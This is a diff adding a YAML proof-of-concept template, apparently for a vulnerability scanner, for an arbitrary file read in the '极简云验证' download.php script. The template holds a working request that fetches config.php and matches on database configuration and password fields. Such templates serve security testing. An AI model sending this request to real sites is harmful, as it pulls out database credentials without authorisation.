@@ -1,0 +1,16 @@
+id: poc-yaml-simpleauth-download-fileread
+info:
+  name: 极简云验证 download.php 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 极简云验证
+  fofa: ../assets/img/bg/logo_white.png
+requests:
+- method: GET
+  path: /download.php?file=20b6cb088a8d5c444074&filename=config.php
+  expression: "status_code == 200 && \ncontains(body,\"数据库配置\") &&\ncontains(body,\"\
+    $dbconfig=array\") &&\ncontains(body,\"'pwd'\") &&\ncontains(headers,\"application/force-download\"\
+    )\n"
+variables: {}
+transport: http
